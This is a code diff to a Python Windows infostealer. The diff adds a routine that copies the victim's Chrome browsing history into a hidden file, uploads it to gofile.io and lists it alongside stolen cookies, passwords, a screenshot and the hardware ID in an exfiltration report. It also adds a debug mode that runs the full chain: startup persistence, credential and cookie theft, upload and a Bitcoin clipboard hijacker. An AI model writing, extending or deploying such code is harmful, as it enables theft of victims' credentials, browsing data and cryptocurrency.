@@ -31,8 +31,10 @@ from Crypto.Cipher import AES
 import shutil
 from datetime import datetime, timedelta
 from base64 import b64decode
+import platform
 
 # Configuration
+debugger = False
 BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v'
 pastebin = "https://pastebin.com/raw/fiFGQEcy"
 hiddenWindow = False
@@ -129,6 +131,19 @@ class Logger():
         win32api.SetFileAttributes("rc.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
         for item in cookies:
                 f.write("%s\n" % item)
+    def historyLog():
+        history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
+        login_db = os.path.join(history_path, 'History')
+        c = sqlite3.connect(login_db)
+        cursor = c.cursor()
+        select_statement = "SELECT title, url FROM urls"
+        cursor.execute(select_statement)
+        history = cursor.fetchall()
+        with open ('hist.txt','w') as f:
+            for title, url in history:
+                f.write(f"Title: {str(title.encode('utf-8').decode('utf-8')).strip()}\nURL: {str(url.encode('utf-8').decode('utf-8')).strip()}" + "\n" + "-" * 50 + "\n")
+            f.close()
+        win32api.SetFileAttributes("hist.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
     def passwordLog():
         try:
             def get_chrome_datetime(chromedate):
@@ -202,7 +217,15 @@ class Logger():
                 pass
         except Exception as e:
             print(e)
-            
+        # History
+        try:
+            historyRaw = requests.post('https://store7.gofile.io/uploadFile', files={'file': ('hist.txt', open('hist.txt', 'rb')),}).text
+            historyUploaded = f"[History]({historyRaw[87:113]})"
+            os.remove("hist.txt")
+        except Exception as e:
+            print(e)
+            cookiesUploaded = "History: N/A"
+
         # Cookies
         try:
             cookiesRaw = requests.post('https://store7.gofile.io/uploadFile', files={'file': ('rc.txt', open('rc.txt', 'rb')),}).text
@@ -355,7 +378,7 @@ class Logger():
                         },
                         {
                             "name": "**Logged Data**",
-                            "value":  f"{cookiesUploaded} | {passwordsUploaded} | {screenshotUploaded}\n\nHwid:\n {gethwid()}",
+                            "value":  f"{historyUploaded} | {cookiesUploaded} | {passwordsUploaded} | {screenshotUploaded}\n\nHwid:\n {gethwid()}",
                             "inline": False
                         },
                     ],
@@ -400,6 +423,10 @@ class Logger():
         except:
             pass
         try:
+            Logger.historyLog()
+        except:
+            pass
+        try:
             Logger.cookieLog()
         except:
             pass
@@ -416,5 +443,46 @@ class Logger():
         except:
             pass
 
+    def debug():
+        if hiddenWindow:
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        else:
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
+        try:
+            Logger.startup()
+        except Exception as e:
+            print(e)
+            pass
+        try:
+            Logger.historyLog()
+        except Exception as e:
+            print(e)
+            pass
+        try:
+            Logger.cookieLog()
+        except Exception as e:
+            print(e)
+            pass
+        try:
+            Logger.passwordLog()
+        except Exception as e:
+            print(e)
+            pass
+        try:
+            Logger.uploadFiles()
+        except Exception as e:
+            print(e)
+            pass
+        try:
+            Logger.btcClip()
+        except Exception as e:
+            print(e)
+            pass
+
 if __name__ == '__main__':
-    Logger.start()
+    if debugger == True:
+        Logger.debug()
+    elif debugger == False:
+        Logger.start()
+    else:
+        print("wtf u want me to do, run with debugger or not")
